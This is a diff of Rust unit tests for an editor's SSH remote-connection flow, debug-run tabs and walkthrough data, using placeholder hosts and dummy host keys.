+    app.active_viewer_mut().unwrap().caret = Some((2, 4));
+    let file = root.join("src/lib.rs");
+    app.connect = Some(ConnectUi {
         host: "h.example".into(),
         user: "root".into(),
-        port: 2222,
-        identity: String::new(),
-        send_ai_keys: false,
-    };
-    app.connect = Some(ConnectUi::default());
-    let _ = app.connect_to(host.target());
+        port: "2222".into(),
+        ..ConnectUi::default()
+    });
+    let _ = app.update(Message::Connect(ConnectMsg::Submit));
+    assert!(app.connection.is_remote());
     assert!(
         app.proj.project.is_none(),
         "going remote closes the local project"
@@ -6092,26 +6767,287 @@ fn a_failed_connect_says_so_and_disconnect_reads_the_local_project_again() {
         conn: app.conn_gen,
         reason: "ssh is not installed here".into(),
     }));
+    assert!(!app.connection.is_remote(), "back on this machine");
     assert!(
-        app.handshake_failure.is_some(),
-        "the window must know the host was not reached"
+        matches!(
+            app.connect.as_ref().map(|u| &u.stage),
+            Some(ConnectStage::Error(e)) if e.contains("ssh is not installed")
+        ),
+        "the form says why"
     );
-
-    let _ = app.update(Message::Connect(ConnectMsg::Disconnect));
-    assert!(!app.connection.is_remote());
-    assert!(app.left_local.is_none());
+    assert!(
+        app.status.contains("ssh is not installed"),
+        "{}",
+        app.status
+    );
+    assert!(
+        !app.saved_connections.iter().any(|c| c.host == "h.example"),
+        "a host that never answered is not saved"
+    );
     let reopening = app.pending_scan_root.as_deref() == Some(root.as_path())
         || app.pending_consent.as_deref() == Some(root.as_path());
     assert!(reopening, "the local project is not opened again");
+    assert_eq!(app.pending_open.as_deref(), Some(file.as_path()));
+    assert_eq!(app.pending_open_line, Some(3));
+    // Opened, the file is where the reader left it.
+    scan_synchronously(&mut app, root.clone());
+    land_active_load(&mut app, file.clone(), Some(3));
+    let v = app.active_viewer().expect("the file is open again");
+    assert_eq!(v.abs, file);
+    assert_eq!(v.target_line, Some(3));
+}
 
-    // The local transport's handshake lands: the headline has done its job.
-    app.status = tr!("Connecting to {host}…", host = app.connection.label());
+/// The host dialled from the form is saved once it answers, and only then.
+/// A link that came up and later dropped keeps its project to reconnect to:
+/// the way home is only for a connect that never came up.
+#[test]
+fn a_host_is_saved_once_it_answers() {
+    let mut app = scanned_app("connect-saved-on-answer");
+    app.connect = Some(ConnectUi {
+        host: "answers.example".into(),
+        user: "root".into(),
+        ..ConnectUi::default()
+    });
+    let _ = app.update(Message::Connect(ConnectMsg::Submit));
+    assert!(
+        !app.saved_connections
+            .iter()
+            .any(|c| c.host == "answers.example")
+    );
     let _ = app.on_server_ready();
     assert!(
-        !app.status.contains("Connecting to"),
-        "the status line still says {:?}",
-        app.status
+        app.saved_connections
+            .iter()
+            .any(|c| c.host == "answers.example"),
+        "{:?}",
+        app.saved_connections
     );
+    assert!(app.dial.is_none());
+    // Up, then dropped: no way home — the window stays on the host, to
+    // reconnect to.
+    let _ = app.update(Message::Server(ServerMsg::Unavailable {
+        conn: app.conn_gen,
+        reason: "the link dropped".into(),
+    }));
+    assert!(app.connection.is_remote());
+}
+
+/// A Revoke clicked while the host connects stands once it answers: the
+/// form's tick, saved when it answered, wrote the keys back — and the next
+/// click on that saved host sent them to a host the reader had revoked.
+#[test]
+fn a_revoke_while_connecting_stands_once_the_host_answers() {
+    let mut app = scanned_app("connect-revoke-while-dialling");
+    app.connect = Some(ConnectUi {
+        host: "keys.example".into(),
+        user: "root".into(),
+        send_ai_keys: true,
+        ..ConnectUi::default()
+    });
+    let _ = app.update(Message::Connect(ConnectMsg::Submit));
+    assert!(app.remote_ai_opt_in);
+    let _ = app.update(Message::Connect(ConnectMsg::RevokeAiKeys));
+    let _ = app.on_server_ready();
+    let saved = app
+        .saved_connections
+        .iter()
+        .find(|c| c.host == "keys.example")
+        .expect("saved once it answered");
+    assert!(!saved.send_ai_keys, "the revoke was undone");
+}
+
+/// A connect asked again while the project of the last one that failed is
+/// still on its way back (its scan, its consent sheet) keeps the way home:
+/// it failing too reopens that project; it answering leaves it to come back
+/// to.
+#[test]
+fn a_retry_while_the_project_reopens_keeps_the_way_home() {
+    let mut app = scanned_app("connect-fast-retry");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    open_synchronously(&mut app, "src/lib.rs", Some(3));
+    app.active_viewer_mut().unwrap().caret = Some((2, 0));
+    let form = |host: &str| ConnectUi {
+        host: host.into(),
+        user: "root".into(),
+        ..ConnectUi::default()
+    };
+    app.connect = Some(form("hots.example"));
+    let _ = app.update(Message::Connect(ConnectMsg::Submit));
+    let _ = app.update(Message::Server(ServerMsg::Unavailable {
+        conn: app.conn_gen,
+        reason: "no such host".into(),
+    }));
+    assert!(!app.connection.is_remote());
+    assert!(app.proj.project.is_none(), "still reopening");
+    // The typo fixed, asked again before the project is back.
+    app.connect = Some(form("host.example"));
+    let _ = app.update(Message::Connect(ConnectMsg::Submit));
+    assert_eq!(
+        app.left_local.as_deref(),
+        Some(root.as_path()),
+        "the project on its way back is the one to come back to"
+    );
+    let _ = app.update(Message::Server(ServerMsg::Unavailable {
+        conn: app.conn_gen,
+        reason: "still no host".into(),
+    }));
+    assert!(!app.connection.is_remote());
+    let reopening = app.pending_scan_root.as_deref() == Some(root.as_path())
+        || app.pending_consent.as_deref() == Some(root.as_path());
+    assert!(reopening, "the project was lost on the second failure");
+    assert_eq!(app.pending_open_line, Some(3));
+}
+
+/// A connect clew made on its own — `CLEW_SSH` at startup — has nowhere
+/// else to go back to: its host key turned down leaves the window on that
+/// host, saying why, to trust it from there. Going home dropped a target
+/// only a restart could dial again.
+#[test]
+fn a_key_turned_down_for_a_startup_host_stays_on_it() {
+    let mut app = blank_app();
+    let target = crate::backend::connect::ConnTarget::Ssh {
+        label: "root@bastioned".into(),
+        args: vec!["-J".into(), "bastion".into(), "root@bastioned".into()],
+    };
+    app.connection = target.clone();
+    app.connect = Some(ConnectUi {
+        stage: ConnectStage::TrustHost {
+            target: target.clone(),
+            reason: "bastioned is not a known host".into(),
+            key: crate::backend::connect::ScannedHostKey {
+                host: "bastioned".into(),
+                line: "bastioned ssh-ed25519 AAAA".into(),
+                kind: "ED25519".into(),
+                fingerprint: "SHA256:abc".into(),
+            },
+        },
+        ..ConnectUi::default()
+    });
+    let _ = app.update(Message::Connect(ConnectMsg::TrustCancel));
+    assert_eq!(app.connection, target, "the startup host was dropped");
+    assert!(matches!(
+        app.connect.as_ref().map(|u| &u.stage),
+        Some(ConnectStage::Error(e)) if e.contains("not a known host")
+    ));
+}
+
+/// A connect asked from another host that never comes up goes back to that
+/// host, and its project — not to this machine.
+#[test]
+fn a_failed_connect_from_a_host_goes_back_to_that_host() {
+    let mut app = scanned_app("connect-failed-back-remote");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    let first = crate::backend::connect::ConnTarget::Ssh {
+        label: "root@first".into(),
+        args: vec!["root@first".into()],
+    };
+    app.connection = first.clone();
+    app.connect = Some(ConnectUi {
+        host: "second.example".into(),
+        user: "root".into(),
+        ..ConnectUi::default()
+    });
+    let _ = app.update(Message::Connect(ConnectMsg::Submit));
+    assert_ne!(app.connection, first);
+    let _ = app.update(Message::Server(ServerMsg::Unavailable {
+        conn: app.conn_gen,
+        reason: "second is down".into(),
+    }));
+    assert_eq!(app.connection, first, "back on the host it was on");
+    let reopening = app.pending_scan_root.as_deref() == Some(root.as_path())
+        || app.pending_consent.as_deref() == Some(root.as_path());
+    assert!(reopening, "its project is opened again");
+}
+
+/// Cancel while it connects gives the connect up: the reader is back where
+/// they were. The connect went on with the modal gone and, should it fail,
+/// left an empty window on the host.
+#[test]
+fn cancelling_a_connect_goes_back_to_where_the_reader_was() {
+    let mut app = scanned_app("connect-cancel-home");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    app.connect = Some(ConnectUi {
+        host: "slow.example".into(),
+        user: "root".into(),
+        ..ConnectUi::default()
+    });
+    let _ = app.update(Message::Connect(ConnectMsg::Submit));
+    let gen_before = app.conn_gen;
+    let _ = app.update(Message::Connect(ConnectMsg::Close));
+    assert!(!app.connection.is_remote());
+    assert!(app.conn_gen > gen_before, "the dial goes on");
+    assert!(app.connect.is_none());
+    let reopening = app.pending_scan_root.as_deref() == Some(root.as_path())
+        || app.pending_consent.as_deref() == Some(root.as_path());
+    assert!(reopening);
+    // Nothing to save, and nothing more to undo.
+    let _ = app.on_server_ready();
+    assert!(
+        !app.saved_connections
+            .iter()
+            .any(|c| c.host == "slow.example")
+    );
+}
+
+/// A host whose server refuses the handshake never came up either: a
+/// connect from the form goes back, as for any other failure.
+#[test]
+fn a_refused_handshake_from_the_form_goes_back() {
+    let mut app = scanned_app("connect-refused-home");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    app.connect = Some(ConnectUi {
+        host: "old.example".into(),
+        user: "root".into(),
+        ..ConnectUi::default()
+    });
+    let _ = app.update(Message::Connect(ConnectMsg::Submit));
+    let _ = app.on_handshake_failed("clew-server speaks protocol 3".into());
+    assert!(!app.connection.is_remote());
+    assert!(
+        app.handshake_failure.is_none(),
+        "the host's verdict is not this machine's"
+    );
+    assert!(matches!(
+        app.connect.as_ref().map(|u| &u.stage),
+        Some(ConnectStage::Error(e)) if e.contains("protocol 3")
+    ));
+    let reopening = app.pending_scan_root.as_deref() == Some(root.as_path())
+        || app.pending_consent.as_deref() == Some(root.as_path());
+    assert!(reopening);
+}
+
+/// A host whose key is not trusted, its prompt cancelled, never connected
+/// either: back home, as any connect that never came up.
+#[test]
+fn a_host_key_turned_down_goes_back_to_where_the_reader_was() {
+    let mut app = scanned_app("connect-trust-cancel-home");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    app.connect = Some(ConnectUi {
+        host: "new.example".into(),
+        user: "root".into(),
+        ..ConnectUi::default()
+    });
+    let _ = app.update(Message::Connect(ConnectMsg::Submit));
+    let target = app.connection.clone();
+    app.connect.as_mut().unwrap().stage = ConnectStage::TrustHost {
+        target,
+        reason: "new.example is not a known host".into(),
+        key: crate::backend::connect::ScannedHostKey {
+            host: "new.example".into(),
+            line: "new.example ssh-ed25519 AAAA".into(),
+            kind: "ED25519".into(),
+            fingerprint: "SHA256:abc".into(),
+        },
+    };
+    let _ = app.update(Message::Connect(ConnectMsg::TrustCancel));
+    assert!(!app.connection.is_remote());
+    assert!(matches!(
+        app.connect.as_ref().map(|u| &u.stage),
+        Some(ConnectStage::Error(e)) if e.contains("not a known host")
+    ));
+    let reopening = app.pending_scan_root.as_deref() == Some(root.as_path())
+        || app.pending_consent.as_deref() == Some(root.as_path());
+    assert!(reopening);
 }
 
 /// A server that refuses the handshake fails the Connect modal waiting on it
@@ -6531,6 +7467,7 @@ fn project_switch_clears_ask_history_and_pins() {
         answer_md: "returns Point".into(),
         answer: Vec::new(),
         settled: 0,
+        draft_from: None,
         sources: Vec::new(),
         steps: Vec::new(),
         streaming: false,
@@ -6601,6 +7538,10 @@ fn remote_project_never_touches_local_state_or_files() {
         },
     );
     assert!(app.proj.project.is_some());
+    // Nor the branch, which this stand-in server answers no more than the
+    // marks.
+    app.proj.head_stale = false;
+    app.proj.repo_tip_stale = false;
     // The planted local .clew state was not read…
     assert!(
         app.proj.bookmarks.is_empty(),
@@ -7224,6 +8165,7 @@ fn a_failed_debug_run_stops_what_it_started() {
     app.debug.session = Some(DebugSession {
         client: None,
         status: DebugStatus::Running,
+        exit_code: None,
         thread_id: None,
         frames: Vec::new(),
         scopes: Vec::new(),
@@ -7251,49 +8193,192 @@ fn a_failed_debug_run_stops_what_it_started() {
     assert!(app.status.contains("Debug failed"), "{}", app.status);
 }
 
-/// A program that ended leaves its session on screen, but nothing runs in
-/// it: Debug starts again instead of answering "already running" until the
-/// reader thinks to press Stop.
+/// Runs open side by side, each in a tab of its own: a second Debug while
+/// the first runs starts beside it — it was refused as "already running" —
+/// each run keeps its own messages, off screen too, and an ended run of the
+/// same program, run the same way, gives its tab to the next one.
 #[test]
-fn debug_starts_again_after_the_program_ended() {
-    let mut app = scanned_app("debug-restart-ended");
-    app.debug.session = Some(DebugSession {
-        client: None,
-        status: DebugStatus::Terminated,
-        thread_id: None,
-        frames: Vec::new(),
-        scopes: Vec::new(),
-        watches: Vec::new(),
-        output: Vec::new(),
-        current: None,
-        program: PathBuf::from("/bin/true"),
-        args: Vec::new(),
-        cwd: PathBuf::from("/"),
-        addr: None,
-    });
-    let run = app.debug_run;
+fn runs_open_side_by_side_each_in_its_own_tab() {
+    use crate::app::state::RunTab;
+    let mut app = scanned_app("debug-tabs");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    std::fs::write(root.join("app.py"), "print('hi')\n").unwrap();
+    open_synchronously(&mut app, "app.py", None);
+    let _ = app.start_debug();
+    let (first, first_tab) = (app.debug_run, app.debug.tab);
+    assert_ne!(first_tab, 0);
     let _ = app.start_debug();
     assert!(!app.status.contains("already running"), "{}", app.status);
-    assert!(app.debug.session.is_none(), "the ended session was kept");
-    assert_ne!(app.debug_run, run, "the ended run's identity lived on");
+    let (second, second_tab) = (app.debug_run, app.debug.tab);
+    assert_ne!(second, first);
+    assert_ne!(second_tab, first_tab);
+    assert_eq!(
+        app.run_tabs(),
+        [RunTab::Real(first_tab), RunTab::Real(second_tab)]
+    );
+    assert_eq!(app.shown_run_tab(), Some(RunTab::Real(second_tab)));
+    // Each run's adapter answers; the first's, off screen, too.
+    let rt = tokio::runtime::Runtime::new().unwrap();
+    for run in [first, second] {
+        let (client, _seen) = fake_js_session(&rt);
+        let _ = app.update(Message::Debug(DebugMsg::DapStarted {
+            stamp: app.transport_stamp(),
+            run,
+            client,
+            addr: None,
+            hover_safe: false,
+            proxied: false,
+        }));
+    }
+    assert_eq!(
+        app.debug.session.as_ref().unwrap().status,
+        DebugStatus::Running
+    );
+    assert_eq!(
+        app.debug_parked[0].session.as_ref().unwrap().status,
+        DebugStatus::Running,
+        "the first's start, taken off screen"
+    );
+    // The first, off screen, still hears from its program.
+    let said = |app: &mut App, run: u64, text: &str| {
+        let _ = app.update(Message::Debug(DebugMsg::DapEvent {
+            stamp: app.transport_stamp(),
+            run,
+            event: dap::DapEvent::Output(dap::proto::Output {
+                category: "stdout".into(),
+                text: text.into(),
+            }),
+        }));
+    };
+    said(&mut app, first, "one\n");
+    said(&mut app, second, "two\n");
+    let output = |app: &App| {
+        app.debug
+            .session
+            .as_ref()
+            .unwrap()
+            .output
+            .iter()
+            .map(|(_, t)| t.as_str())
+            .collect::<String>()
+    };
+    assert_eq!(output(&app), "two\n", "the second's own, on screen");
+    assert_eq!(app.debug.tab, second_tab);
+    let _ = app.update(Message::Debug(DebugMsg::ShowTab(RunTab::Real(first_tab))));
+    assert_eq!(app.debug.tab, first_tab);
+    assert_eq!(app.debug_run, first);
+    assert_eq!(output(&app), "one\n", "the first's, kept while off screen");
+    assert_eq!(app.debug_parked.len(), 1, "the second set aside");
 
-    // A session still running is not replaced.
-    app.debug.session = Some(DebugSession {
-        client: None,
-        status: DebugStatus::Running,
-        thread_id: None,
-        frames: Vec::new(),
-        scopes: Vec::new(),
-        watches: Vec::new(),
-        output: Vec::new(),
-        current: None,
-        program: PathBuf::from("/bin/true"),
-        args: Vec::new(),
-        cwd: PathBuf::from("/"),
-        addr: None,
-    });
+    // The second, off screen, stops: the tab on screen is running, not
+    // being read, so the stop brings the second on screen.
+    let _ = app.update(Message::Debug(DebugMsg::DapEvent {
+        stamp: app.transport_stamp(),
+        run: second,
+        event: dap::DapEvent::Stopped(dap::proto::Stopped {
+            reason: "breakpoint".into(),
+            thread_id: Some(1),
+            description: None,
+            text: None,
+            all_threads: false,
+        }),
+    }));
+    assert_eq!(app.shown_run_tab(), Some(RunTab::Real(second_tab)));
+    assert_eq!(app.debug_run, second);
+    assert_eq!(
+        app.debug.session.as_ref().unwrap().status,
+        DebugStatus::Stopped
+    );
+
+    // The first stops too, while the second is paused on screen, being
+    // read: it is said, and waits in its tab — the screen is not taken.
+    let _ = app.update(Message::Debug(DebugMsg::DapEvent {
+        stamp: app.transport_stamp(),
+        run: first,
+        event: dap::DapEvent::Stopped(dap::proto::Stopped {
+            reason: "breakpoint".into(),
+            thread_id: Some(1),
+            description: None,
+            text: None,
+            all_threads: false,
+        }),
+    }));
+    assert_eq!(app.shown_run_tab(), Some(RunTab::Real(second_tab)));
+    assert!(app.status.contains("its tab shows where"), "{}", app.status);
+    let faces = app.run_tab_faces();
+    assert_eq!(faces[0].state, crate::app::runs::TabState::Paused);
+
+    // The first ends, off screen; debugged again, it takes its own tab.
+    let _ = app.update(Message::Debug(DebugMsg::DapEvent {
+        stamp: app.transport_stamp(),
+        run: first,
+        event: dap::DapEvent::Terminated,
+    }));
+    assert_eq!(app.run_tabs().len(), 2, "an ended run stays, to be read");
     let _ = app.start_debug();
-    assert!(app.status.contains("already running"), "{}", app.status);
+    assert_eq!(app.debug.tab, first_tab, "run again in its tab");
+    assert_eq!(app.run_tabs().len(), 2);
+
+    // Closed, a tab's run ends, and the tab beside it is shown.
+    let _ = app.update(Message::Debug(DebugMsg::CloseTab(RunTab::Real(first_tab))));
+    assert_eq!(app.run_tabs(), [RunTab::Real(second_tab)]);
+    assert_eq!(app.shown_run_tab(), Some(RunTab::Real(second_tab)));
+    assert_eq!(app.debug.tab, second_tab);
+    assert!(app.show_bottom, "a run is still there to read");
+}
+
+/// Stop ends the program, and its tab stays with what it printed, ended:
+/// Debug Again runs it again in that tab, and the tab's × closes it.
+#[test]
+fn stop_keeps_the_tab_and_again_runs_it_in_it() {
+    use crate::app::state::RunTab;
+    let mut app = scanned_app("debug-stop-again");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    std::fs::write(root.join("app.py"), "print('hi')\n").unwrap();
+    open_synchronously(&mut app, "app.py", None);
+    let _ = app.start_run();
+    let tab = app.debug.tab;
+    let _ = app.update(Message::Debug(DebugMsg::DapEvent {
+        stamp: app.transport_stamp(),
+        run: app.debug_run,
+        event: dap::DapEvent::Output(dap::proto::Output {
+            category: "stdout".into(),
+            text: "hi\n".into(),
+        }),
+    }));
+    let _ = app.update(Message::Debug(DebugMsg::Stop));
+    let session = app.debug.session.as_ref().expect("its tab stays");
+    assert_eq!(session.status, DebugStatus::Terminated);
+    assert_eq!(session.output.len(), 1, "with what it printed");
+    assert_eq!(app.status, "Program stopped");
+    let _ = app.update(Message::Debug(DebugMsg::Again));
+    let session = app.debug.session.as_ref().unwrap();
+    assert_eq!(session.status, DebugStatus::Launching, "running again");
+    assert!(app.debug.no_debug, "as it was: Run, not Debug");
+    assert_eq!(app.debug.tab, tab, "in its own tab");
+    let _ = app.update(Message::Debug(DebugMsg::CloseTab(RunTab::Real(tab))));
+    assert!(app.debug.session.is_none());
+    assert!(app.run_tabs().is_empty());
+    // L16: the last run closed, the panel goes with it — it stayed saying
+    // "Nothing is running", the code and the margin short of its room.
+    assert!(!app.show_bottom, "the empty panel stays");
+    // But a proof being walked, which the panel shows once no run is
+    // there, stays in view: it went, with nothing to bring it back.
+    let _ = app.start_run();
+    let tab = app.debug.tab;
+    app.proj.proof = Some(crate::app::proof::ProofWalk {
+        abs: root.join("app.py"),
+        name: "thm".into(),
+        steps: Vec::new(),
+        goals: None,
+        failed: None,
+        at: 0,
+        token: 0,
+    });
+    let _ = app.update(Message::Debug(DebugMsg::Stop));
+    let _ = app.update(Message::Debug(DebugMsg::CloseTab(RunTab::Real(tab))));
+    assert!(app.run_tabs().is_empty());
+    assert!(app.show_bottom, "the proof walk was hidden");
 }
 
 /// Stopping during `Launching` — before the adapter handed back a client —
@@ -7305,6 +8390,7 @@ fn debug_stop_while_launching_cancels_the_startup() {
     app.debug.session = Some(DebugSession {
         client: None, // still Launching: nothing to disconnect
         status: DebugStatus::Launching,
+        exit_code: None,
         thread_id: None,
         frames: Vec::new(),
         scopes: Vec::new(),
@@ -7320,7 +8406,13 @@ fn debug_stop_while_launching_cancels_the_startup() {
     let launching = app.debug_run;
 
     let _ = app.update(Message::Debug(DebugMsg::Stop));
-    assert!(app.debug.session.is_none());
+    let ended = |app: &App| {
+        app.debug
+            .session
+            .as_ref()
+            .is_some_and(|s| s.status == DebugStatus::Terminated && s.client.is_none())
+    };
+    assert!(ended(&app), "its tab stays, ended");
     assert_ne!(app.debug_run, launching, "the run identity moved on");
     assert_eq!(
         app.debug_run_live.load(std::sync::atomic::Ordering::SeqCst),
@@ -7334,7 +8426,7 @@ fn debug_stop_while_launching_cancels_the_startup() {
         run: launching,
         event: dap::DapEvent::Terminated,
     }));
-    assert!(app.debug.session.is_none());
+    assert!(ended(&app), "no session resurrects");
 }
 
 /// Start a debug run in a REMOTE project and drive it the way the runtime
@@ -7604,6 +8696,7 @@ fn a_delta_from_a_superseded_stream_never_lands_in_another_turn() {
         answer_md: String::new(),
         answer: Vec::new(),
         settled: 0,
+        draft_from: None,
         sources: Vec::new(),
         steps: Vec::new(),
         streaming: true,
@@ -8474,6 +9567,7 @@ fn a_generated_walkthrough_keeps_the_other_windows_tour() {
     // The other window generates and persists a tour.
     std::fs::create_dir_all(root.join(".clew").join("cache")).unwrap();
     let theirs = walkthrough::Walkthrough {
+        made: None,
         title: "Theirs".into(),
         scope: "theirs".into(),
         steps: vec![walkthrough::Step {
@@ -8482,12 +9576,15 @@ fn a_generated_walkthrough_keeps_the_other_windows_tour() {
             symbol: None,
             line: Some(1),
             narration: "n".into(),
+            depth: 0,
+            stop: None,
         }],
     };
     walkthrough::save_library(&root, &[theirs]).unwrap();
 
     // This window's generation lands, from its stale (empty) library.
     let mine = walkthrough::Walkthrough {
+        made: None,
         title: "Mine".into(),
         scope: String::new(),
         steps: vec![walkthrough::Step {
@@ -8496,6 +9593,8 @@ fn a_generated_walkthrough_keeps_the_other_windows_tour() {
             symbol: None,
             line: Some(1),
             narration: "n".into(),
+            depth: 0,
+            stop: None,
         }],
     };
     // (The generation this window is waiting for.)
@@ -8555,6 +9654,9 @@ fn an_answer_shown_clears_the_line_that_said_it_was_coming() {
         commits: vec![("abc1234".into(), "Add it".into())],
         loading: true,
         prepared: Vec::new(),
+        fix: None,
+        asked: None,
+        failed: false,
     });
     app.status = tr!("Explaining why…").into();
     let s = stamp();
@@ -8572,6 +9674,7 @@ fn an_answer_shown_clears_the_line_that_said_it_was_coming() {
     app.proj.walk.seq += 1;
     app.proj.walk.pending = Some(app.proj.walk.seq);
     let tour = walkthrough::Walkthrough {
+        made: None,
         title: "Tour".into(),
         scope: String::new(),
         steps: vec![walkthrough::Step {
@@ -8580,6 +9683,8 @@ fn an_answer_shown_clears_the_line_that_said_it_was_coming() {
             symbol: None,
             line: Some(1),
             narration: "n".into(),
+            depth: 0,
+            stop: None,
         }],
     };
     let s = stamp();
@@ -8965,6 +10070,7 @@ fn add_to_ask_without_a_selection_adds_the_line_clicked() {
         insight: None,
         served: true,
         by_pointer: true,
+        line_top: None,
     };
     // `pub fn origin() -> Point {`, the third line.
     app.proj.context_menu = Some(menu(2));
@@ -9023,6 +10129,7 @@ fn a_popup_asked_from_the_menu_keeps_where_it_was_asked() {
         insight,
         served: true,
         by_pointer: true,
+        line_top: None,
     };
     app.proj.context_menu = Some(menu(None));
     let _ = app.update(Message::TimeTravel(TimeTravelMsg::WhyIsThisHere));
@@ -9039,6 +10146,26 @@ fn a_popup_asked_from_the_menu_keeps_where_it_was_asked() {
     let why = app.proj.blame_why.as_ref().unwrap();
     assert!(!why.loading, "the answer came in");
     assert_eq!(why.anchor, Some(321.0), "the answer stays where asked");
+    assert_eq!(why.fix, None);
+    // Failed for want of the provider: the popup's way to Settings, at
+    // the base URL — and the status line does not say it over again.
+    let _ = app.update(Message::TimeTravel(TimeTravelMsg::WhyIsThisHere));
+    let why = app.proj.blame_why.as_ref().expect("asked again");
+    let (token, title, commits) = (why.token, why.title.clone(), why.commits.clone());
+    let _ = app.update(Message::TimeTravel(TimeTravelMsg::BlameWhyDone {
+        stamp: app.stamp(),
+        token,
+        title,
+        commits,
+        result: Err("request failed: Connection refused (os error 111)".into()),
+    }));
+    let why = app.proj.blame_why.as_ref().unwrap();
+    assert_eq!(why.fix, Some(crate::app::state::LlmField::BaseUrl));
+    assert!(
+        !app.status.starts_with("Couldn't explain"),
+        "{}",
+        app.status
+    );
 
     app.proj.context_menu = Some(menu(Some(crate::InsightKind::ExpandMacro)));
     let _ = app.update(Message::Hover(HoverMsg::Insight));
@@ -9060,6 +10187,7 @@ fn a_popup_asked_from_the_menu_keeps_where_it_was_asked() {
     // Nor does the language's answer, from a menu no pointer opened.
     app.proj.context_menu = Some(ContextMenu {
         by_pointer: false,
+        line_top: None,
         ..menu(Some(crate::InsightKind::ExpandMacro))
     });
     let _ = app.update(Message::Hover(HoverMsg::Insight));
@@ -9364,6 +10492,42 @@ fn a_visit_before_the_remote_trail_loads_is_added_to_it_not_written_over_it() {
     );
 }
 
+/// R16-3: a remote project reopened goes back where it was read, as a
+/// local one does — its trail comes over the link, not from the local
+/// load, and was never acted on; a reconnect's read of it opens nothing.
+#[test]
+fn a_reopened_remote_project_goes_back_where_it_was_read() {
+    use crate::history::{History, Loc};
+    let (mut app, root, _rx) = remote_app("remote-back-where-read");
+    let root_s = root.to_string_lossy().into_owned();
+    app.proj.overview.showing = true;
+    let mut stored = History::default();
+    stored.push(
+        Loc {
+            path: root.join("src/lib.rs"),
+            line: Some(3),
+        },
+        Some("lib".into()),
+    );
+    let stored = crate::history::to_text(&root, &stored).unwrap();
+    let read = |app: &mut App| {
+        let _ = app.handle_server_event(clew_protocol::Event::StateContent {
+            root: root_s.clone(),
+            rel: "history.json".into(),
+            text: Some(stored.clone()),
+        });
+    };
+    read(&mut app);
+    assert!(!app.proj.overview.showing, "still on the overview");
+    assert!(app.proj.link.pane_pending[0].is_some(), "nothing opened");
+    // A reconnect reads it again: the reader is left where they are.
+    app.proj.link.pane_pending[0] = None;
+    app.proj.overview.showing = true;
+    read(&mut app);
+    assert!(app.proj.link.pane_pending[0].is_none(), "opened again");
+    assert!(app.proj.overview.showing);
+}
+
 /// The remote twin of `a_generated_walkthrough_keeps_the_other_windows_tour`.
 ///
 /// What a remote merge replies with is the FILE's list in the FILE's order —
@@ -9392,6 +10556,7 @@ fn an_adopted_remote_walkthrough_library_keeps_the_open_tour_by_scope() {
 
     // It regenerates that tour, which travels as an upsert by scope.
     let mine = walkthrough::Walkthrough {
+        made: None,
         title: "Mine".into(),
         scope: "mine".into(),
         steps: vec![walkthrough::Step {
@@ -9400,6 +10565,8 @@ fn an_adopted_remote_walkthrough_library_keeps_the_open_tour_by_scope() {
             symbol: None,
             line: Some(1),
             narration: "n".into(),
+            depth: 0,
+            stop: None,
         }],
     };
     assert!(app.save_walkthrough_scope("mine", Some(&mine)));
@@ -10713,6 +11880,7 @@ fn an_edit_held_back_for_its_turn_is_said_to_wait_for_it() {
     let (mut app, _, mut rx) = remote_app("remote-state-said-to-wait-tours");
     let tour = |scope: &str| {
         walkthrough::merge_upsert(&walkthrough::Walkthrough {
+            made: None,
             title: scope.into(),
             scope: scope.into(),
             steps: Vec::new(),
@@ -10825,6 +11993,7 @@ fn an_edit_held_back_for_its_turn_is_said_to_wait_for_it() {
 fn a_close_waits_for_an_agreed_edit_a_later_one_must_land_after() {
     let tour = |scope: &str| {
         walkthrough::merge_upsert(&walkthrough::Walkthrough {
+            made: None,
             title: scope.into(),
             scope: scope.into(),
             steps: Vec::new(),
@@ -11353,6 +12522,7 @@ fn edits_a_host_fails_while_a_close_waits_end_as_they_were_made() {
 fn the_walkthrough_library_keeps_the_order_its_edits_were_made_in() {
     let tour = |scope: &str| {
         walkthrough::merge_upsert(&walkthrough::Walkthrough {
+            made: None,
             title: scope.into(),
             scope: scope.into(),
             steps: Vec::new(),
@@ -11573,6 +12743,7 @@ fn the_edits_given_up_while_a_window_closes_are_kept_within_a_bound() {
 #[test]
 fn a_retry_said_of_one_edit_is_not_taken_back_for_another_named_alike() {
     let tour = |scope: &str| walkthrough::Walkthrough {
+        made: None,
         title: "tour".into(),
         scope: scope.into(),
         steps: Vec::new(),
@@ -12759,6 +13930,27 @@ fn a_scrub_keeps_the_readers_place_on_both_axes() {
     land(&mut app, 0, Some(20));
     let ((x, _), (vx, _)) = place(&app);
     assert_eq!((x, vx), (0.0, 0.0));
+
+    // A start at a commit asked for (the History view): its first revision
+    // opens on the first line that commit added — once.
+    app.proj.time_travel.as_mut().unwrap().reveal_change = true;
+    let content = "pub struct Point { x: f64 }\n".repeat(40);
+    let msg = Message::TimeTravel(TimeTravelMsg::Step {
+        stamp: app.stamp(),
+        generation: app.proj.time_gen,
+        idx: 1,
+        step: Ok(Box::new(TimeStep {
+            lines: highlight::plain_lines(&content),
+            content,
+            symbols: Vec::new(),
+            added: [31, 32, 30].into_iter().collect(),
+            focus_line: None,
+        })),
+    });
+    let _ = app.update(msg);
+    let tt = app.proj.time_travel.as_ref().unwrap();
+    assert_eq!(tt.caret, Some((29, 0)), "at the first line it added");
+    assert!(!tt.reveal_change, "once");
 }
 
 /// Every editor, popup and match set that anchors to a path, a pane or a trail
@@ -12786,6 +13978,7 @@ fn a_project_switch_drops_every_anchor_into_the_old_project() {
         scroll_x: 0.0,
         caret: None,
         focus_line: None,
+        reveal_change: false,
         loading: false,
         generation: app.proj.time_gen,
         session: app.proj.time_gen,
@@ -12809,6 +14002,9 @@ fn a_project_switch_drops_every_anchor_into_the_old_project() {
         commits: Vec::new(),
         loading: true,
         prepared: Vec::new(),
+        fix: None,
+        asked: None,
+        failed: false,
     });
     app.proj.context_menu = Some(ContextMenu {
         pane: 0,
@@ -12819,6 +14015,7 @@ fn a_project_switch_drops_every_anchor_into_the_old_project() {
         insight: None,
         served: true,
         by_pointer: true,
+        line_top: None,
     });
     app.proj.find.open = true;
     app.proj.find.query = "Point".into();
@@ -13331,7 +14528,12 @@ fn a_question_that_fails_comes_back_and_a_draft_stays() {
